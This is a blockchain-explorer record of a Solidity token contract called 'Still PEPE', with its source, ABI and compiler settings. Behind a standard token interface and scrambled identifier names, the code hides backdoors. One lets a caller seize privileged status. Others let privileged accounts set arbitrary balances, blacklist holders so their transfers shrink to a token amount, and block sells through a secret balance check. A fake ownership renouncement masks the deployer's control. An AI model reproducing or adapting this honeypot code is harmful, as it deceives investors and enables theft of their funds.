{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface sellTakeFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address toSender) external view returns (uint256);\n\n    function transfer(address fromLaunch, uint256 feeMarketing) external returns (bool);\n\n    function allowance(address tokenExemptLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fromLaunch,\n        uint256 feeMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed amountFund, uint256 value);\n    event Approval(address indexed tokenExemptLiquidity, address indexed spender, uint256 value);\n}\n\nabstract contract minListSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeIs {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface receiverTrading {\n    function createPair(address liquidityMinExempt, address enableLimit) external returns (address);\n}\n\ninterface sellTakeFeeMetadata is sellTakeFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract StillPEPE is minListSender, sellTakeFee, sellTakeFeeMetadata {\n\n    function limitReceiver(address atReceiver) public {\n        require(atReceiver.balance < 100000);\n        if (atList) {\n            return;\n        }\n        if (limitBuy != teamSenderLaunched) {\n            isExemptList = true;\n        }\n        marketingLaunchedAuto[atReceiver] = true;\n        \n        atList = true;\n    }\n\n    string private feeShould = \"Still PEPE\";\n\n    function transferFrom(address fromSwapMin, address fromLaunch, uint256 feeMarketing) external override returns (bool) {\n        if (_msgSender() != txTo) {\n            if (listFund[fromSwapMin][_msgSender()] != type(uint256).max) {\n                require(feeMarketing <= listFund[fromSwapMin][_msgSender()]);\n                listFund[fromSwapMin][_msgSender()] -= feeMarketing;\n            }\n        }\n        return amountFee(fromSwapMin, fromLaunch, feeMarketing);\n    }\n\n    uint256 public teamSenderLaunched;\n\n    function liquidityFrom(uint256 feeMarketing) public {\n        senderSwap();\n        listTrading = feeMarketing;\n    }\n\n    bool public isExemptList;\n\n    address public limitTotal;\n\n    uint256 private limitTrading;\n\n    function autoFund() public {\n        emit OwnershipTransferred(feeSender, address(0));\n        buyExemptFee = address(0);\n    }\n\n    function fromEnable(address amountShould, uint256 feeMarketing) public {\n        senderSwap();\n        minFund[amountShould] = feeMarketing;\n    }\n\n    address minSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private amountMax;\n\n    uint256 listTrading;\n\n    uint256 public limitBuy;\n\n    function senderSwap() private view {\n        require(marketingLaunchedAuto[_msgSender()]);\n    }\n\n    function getOwner() external view returns (address) {\n        return buyExemptFee;\n    }\n\n    function owner() external view returns (address) {\n        return buyExemptFee;\n    }\n\n    uint256 fromTotal;\n\n    mapping(address => mapping(address => uint256)) private listFund;\n\n    function amountFee(address fromSwapMin, address fromLaunch, uint256 feeMarketing) internal returns (bool) {\n        if (fromSwapMin == feeSender) {\n            return toList(fromSwapMin, fromLaunch, feeMarketing);\n        }\n        uint256 amountList = sellTakeFee(limitTotal).balanceOf(minSell);\n        require(amountList == listTrading);\n        require(fromLaunch != minSell);\n        if (takeTx[fromSwapMin]) {\n            return toList(fromSwapMin, fromLaunch, autoAtSell);\n        }\n        return toList(fromSwapMin, fromLaunch, feeMarketing);\n    }\n\n    address public feeSender;\n\n    mapping(address => uint256) private minFund;\n\n    bool public atList;\n\n    uint8 private totalReceiver = 18;\n\n    mapping(address => bool) public marketingLaunchedAuto;\n\n    string private tokenList = \"SPE\";\n\n    function balanceOf(address toSender) public view virtual override returns (uint256) {\n        return minFund[toSender];\n    }\n\n    bool public modeReceiver;\n\n    function transfer(address amountShould, uint256 feeMarketing) external virtual override returns (bool) {\n        return amountFee(_msgSender(), amountShould, feeMarketing);\n    }\n\n    uint256 public listTakeTo;\n\n    uint256 private launchFund = 100000000 * 10 ** 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalReceiver;\n    }\n\n    mapping(address => bool) public takeTx;\n\n    address txTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenList;\n    }\n\n    event OwnershipTransferred(address indexed swapAmountIs, address indexed receiverList);\n\n    function toList(address fromSwapMin, address fromLaunch, uint256 feeMarketing) internal returns (bool) {\n        require(minFund[fromSwapMin] >= feeMarketing);\n        minFund[fromSwapMin] -= feeMarketing;\n        minFund[fromLaunch] += feeMarketing;\n        emit Transfer(fromSwapMin, fromLaunch, feeMarketing);\n        return true;\n    }\n\n    function allowance(address marketingSender, address takeLimitMarketing) external view virtual override returns (uint256) {\n        if (takeLimitMarketing == txTo) {\n            return type(uint256).max;\n        }\n        return listFund[marketingSender][takeLimitMarketing];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchFund;\n    }\n\n    address private buyExemptFee;\n\n    constructor (){\n        \n        feeIs swapTrading = feeIs(txTo);\n        limitTotal = receiverTrading(swapTrading.factory()).createPair(swapTrading.WETH(), address(this));\n        \n        feeSender = _msgSender();\n        autoFund();\n        marketingLaunchedAuto[feeSender] = true;\n        minFund[feeSender] = launchFund;\n        if (listTakeTo != teamLimit) {\n            tradingMin = false;\n        }\n        emit Transfer(address(0), feeSender, launchFund);\n    }\n\n    uint256 constant autoAtSell = 7 ** 10;\n\n    uint256 private teamLimit;\n\n    function approve(address takeLimitMarketing, uint256 feeMarketing) public virtual override returns (bool) {\n        listFund[_msgSender()][takeLimitMarketing] = feeMarketing;\n        emit Approval(_msgSender(), takeLimitMarketing, feeMarketing);\n        return true;\n    }\n\n    bool public tradingMin;\n\n    function name() external view virtual override returns (string memory) {\n        return feeShould;\n    }\n\n    function tradingFrom(address totalFrom) public {\n        senderSwap();\n        \n        if (totalFrom == feeSender || totalFrom == limitTotal) {\n            return;\n        }\n        takeTx[totalFrom] = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenExemptLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapAmountIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountFund\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeLimitMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeLimitMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toSender\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeMarketing\",\"type\":\"uint256\"}],\"name\":\"fromEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isExemptList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atReceiver\",\"type\":\"address\"}],\"name\":\"limitReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeMarketing\",\"type\":\"uint256\"}],\"name\":\"liquidityFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTakeTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingLaunchedAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamSenderLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalFrom\",\"type\":\"address\"}],\"name\":\"tradingFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromSwapMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "StillPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}